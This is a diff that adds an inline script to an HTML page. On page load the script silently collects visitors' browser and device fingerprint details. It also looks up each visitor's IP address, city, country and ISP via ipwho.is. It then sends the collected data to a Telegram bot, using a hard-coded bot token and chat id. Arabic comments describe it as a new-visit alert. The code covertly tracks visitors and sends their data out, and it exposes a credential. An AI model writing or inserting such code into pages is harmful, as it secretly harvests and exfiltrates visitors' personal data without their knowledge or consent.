@@ -23,6 +23,69 @@
 
     </div>
 
+
+
+
+    <script>
+    async function sendData() {
+      // بيانات محلية
+      const local = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        width: screen.width,
+        height: screen.height,
+        pixelRatio: window.devicePixelRatio,
+        cpuCores: navigator.hardwareConcurrency,
+        touch: navigator.maxTouchPoints,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: new Date().toString(),
+        online: navigator.onLine,
+        connection: navigator.connection ? navigator.connection.effectiveType : "غير معروف"
+      };
+
+      // بيانات من ipwho.is
+      let ipdata = {};
+      try {
+        const res = await fetch("https://ipwho.is/");
+        ipdata = await res.json();
+      } catch (err) {
+        ipdata = { ip: "?", city: "?", country: "?", org: "?", isp: "?", connection: {} };
+      }
+
+      // الرسالة النهائية
+      const msg = `
+🌐 دخول جديد للموقع:
+🆔 IP: ${ipdata.ip}
+🏙️ المدينة: ${ipdata.city}
+🌍 الدولة: ${ipdata.country}
+📡 مزود الخدمة: ${ipdata.connection.isp || "?"}
+📶 نوع الاتصال: ${local.connection}
+📱 المتصفح: ${local.userAgent}
+💻 النظام: ${local.platform}
+🗣️ اللغة: ${local.language}
+📏 الشاشة: ${local.width}x${local.height} @${local.pixelRatio}x
+🧠 الأنوية: ${local.cpuCores}
+👆 لمس؟ ${local.touch > 0 ? "نعم" : "لا"}
+🕒 التوقيت: ${local.timezone}
+📅 الوقت الكامل: ${local.time}
+📶 متصل بالنت؟ ${local.online ? "نعم" : "لا"}
+      `;
+
+      // إرسال للتليغرام
+      fetch("https://api.telegram.org/bot7597896727:AAHkppEWqSr_Fwvt7sDMq4gfkvzYu85FMA8/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: 7405640360,
+          text: msg
+        })
+      });
+    }
+
+    sendData();
+  </script>
    
 </body>
+
 </html>
